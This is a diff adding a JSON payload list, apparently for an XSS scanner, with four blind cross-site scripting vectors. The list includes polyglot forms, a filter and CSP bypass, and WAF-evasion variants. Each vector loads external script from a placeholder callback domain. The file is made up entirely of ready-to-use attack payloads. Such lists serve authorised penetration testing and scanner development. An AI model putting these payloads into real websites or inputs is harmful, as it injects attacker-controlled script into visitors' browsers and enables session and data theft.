@@ -1,0 +1,82 @@
+[
+  {
+    "Payload": "1'\"<B/--><Img Src=//YOUR_BLIND_XSS_DOMAIN?id=YOUR_ID OnError=import(src)>",
+    "Attribute": [
+      "html",
+      "javascript",
+      "attribute"
+    ],
+    "count": 0,
+    "waf": null,
+    "description": "Blind XSS Custom Vector - Default",
+    "type": "blind_xss_default",
+    "complexity": "advanced",
+    "techniques": [
+      "blind_xss",
+      "polyglot",
+      "external_callback"
+    ],
+    "waf_evasion": true,
+    "source": "knoxss_integration"
+  },
+  {
+    "Payload": "1'\"</Script><Base id=YOUR_ID Href=//YOUR_BLIND_XSS_DOMAIN>",
+    "Attribute": [
+      "html",
+      "javascript",
+      "attribute"
+    ],
+    "count": 0,
+    "waf": null,
+    "description": "Blind XSS Custom Vector - Filter + CSP Bypass   NEW",
+    "type": "blind_xss_csp_bypass",
+    "complexity": "advanced",
+    "techniques": [
+      "blind_xss",
+      "polyglot",
+      "external_callback"
+    ],
+    "waf_evasion": true,
+    "source": "knoxss_integration"
+  },
+  {
+    "Payload": "1'/*\\'/*\"/*\\\"/*</Script/--><Input/AutoFocus/OnFocus=/**/(import(/https:\\\\YOUR_BLIND_XSS_DOMAIN?id=YOUR_ID/.source))//>",
+    "Attribute": [
+      "html",
+      "javascript",
+      "attribute"
+    ],
+    "count": 0,
+    "waf": null,
+    "description": "Blind XSS Custom Vector - Short Polyglot (HTML & JS Main Cases)",
+    "type": "blind_xss_short_polyglot",
+    "complexity": "advanced",
+    "techniques": [
+      "blind_xss",
+      "polyglot",
+      "external_callback"
+    ],
+    "waf_evasion": true,
+    "source": "knoxss_integration"
+  },
+  {
+    "Payload": "JavaScript://%250A/*?'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\\\YOUR_BLIND_XSS_DOMAIN?id=YOUR_ID/.source))}//\\76-->",
+    "Attribute": [
+      "html",
+      "javascript",
+      "attribute"
+    ],
+    "count": 0,
+    "waf": null,
+    "description": "Blind XSS Custom Vector - Full Polyglot (20+ XSS Cases)   RECOMMENDED",
+    "type": "blind_xss_full_polyglot",
+    "complexity": "advanced",
+    "techniques": [
+      "blind_xss",
+      "polyglot",
+      "external_callback"
+    ],
+    "waf_evasion": true,
+    "source": "knoxss_integration"
+  }
+]
